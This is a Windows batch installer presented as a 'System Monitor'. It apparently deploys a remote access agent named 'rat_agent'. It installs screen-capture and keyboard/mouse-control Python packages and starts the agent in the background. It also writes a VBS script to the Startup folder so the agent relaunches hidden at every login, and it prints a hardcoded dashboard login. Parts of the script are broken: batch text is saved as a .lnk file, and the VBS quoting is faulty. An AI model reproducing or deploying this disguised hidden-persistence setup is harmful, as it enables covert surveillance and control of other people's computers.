@echo off
REM ================================================================================
REM System Monitor - Windows Installer
REM ================================================================================

echo.
echo ================================================================
echo              System Monitor - Windows Installer
echo ================================================================
echo.

REM Check Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo [ERROR] Python not found. Please install Python 3.8+ from python.org
    echo.
    pause
    exit /b 1
)

echo [OK] Python detected
python --version

REM Install Python packages
echo.
echo [INFO] Installing Python dependencies...
python -m pip install --quiet flask flask-socketio requests mss pillow python-socketio python-engineio pyautogui
if %errorlevel% neq 0 (
    echo [WARN] Some packages may have failed
)

echo [OK] Python dependencies installed

REM Initialize database
echo.
echo [INFO] Initializing database...
python -c "import sys; sys.path.insert(0, '.'); from rat_agent.database import init_db; init_db()"
if %errorlevel% equ 0 (
    echo [OK] Database initialized
) else (
    echo [WARN] Database may already exist
)

REM Create startup shortcut
echo.
echo [INFO] Creating startup shortcut...
set STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
if not exist "%STARTUP_DIR%" mkdir "%STARTUP_DIR%"

echo Creating startup script...
(
    echo @echo off
    echo cd /d "%~dp0"
    echo start /B python rat_agent\agent.py
) > "%STARTUP_DIR%\System Monitor.lnk"

REM Actually create a proper .vbs for hidden startup
(
    echo Set WshShell = CreateObject("WScript.Shell")
    echo WshShell.Run "cmd /c cd /d "%~dp0" & start /B python rat_agent\agent.py", 0, False
) > "%STARTUP_DIR%\System Monitor.vbs"

echo [OK] Startup shortcut created

REM Start services
echo.
echo [INFO] Starting System Monitor...

REM Start agent
start /B python "%~dp0rat_agent\agent.py"
echo [OK] Agent started

REM Wait a bit
timeout /t 3 /nobreak >nul

REM Start dashboard
start /B python "%~dp0dashboard\app.py"
echo [OK] Dashboard started

echo.
echo ================================================================
echo                    Installation Complete
echo ================================================================
echo.
echo  Local URL:   http://localhost:5000
echo  Login:       admin / rat_admin_2024
echo.
echo  The agent will auto-start on Windows login
echo.
echo  Logs:
echo    Agent:     %TEMP%\sysmon_agent.log
echo    Dashboard: %TEMP%\sysmon_dashboard.log
echo.
echo  To stop:     taskkill /F /IM python.exe
echo.
echo ================================================================
echo.
pause
